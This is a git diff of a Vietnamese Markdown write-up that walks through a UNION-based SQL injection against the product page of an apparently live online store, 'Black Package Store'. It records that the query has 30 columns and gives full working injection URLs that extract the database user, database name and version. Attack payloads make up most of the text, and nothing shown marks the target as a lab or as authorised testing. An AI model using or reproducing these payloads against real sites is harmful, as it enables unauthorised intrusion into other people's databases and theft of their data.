@@ -16,17 +16,26 @@ Kiểm tra trên web "Black Package Store" `https://blackpackagestore.com/produc
 
 ![image](https://github.com/user-attachments/assets/1dae9e7c-ede6-497c-bd76-4927cd8affc5)
 
+=> Số cột lớn hoen 1 và bé hơn 50
+
 ![image](https://github.com/user-attachments/assets/3d4a301c-ba81-467e-a6a6-8014fc79e6f1)
 
+=> Số cột là 30  
 ## Kiểm tra database, version, user 
+
+**1. User**
 
 `https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,user(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
 
 ![image](https://github.com/user-attachments/assets/9fd803ab-520e-4c15-91c6-311e91b50589)
 
+**2. Database**
+
 `https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
 
 ![image](https://github.com/user-attachments/assets/ea00b3ed-b953-4291-bde2-d0e5f1020c4d)
+
+**3. Version**
 
 `https://blackpackagestore.com/product.php?id=72+UNION+ALL+SELECT+1,2,3,4,version(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
 
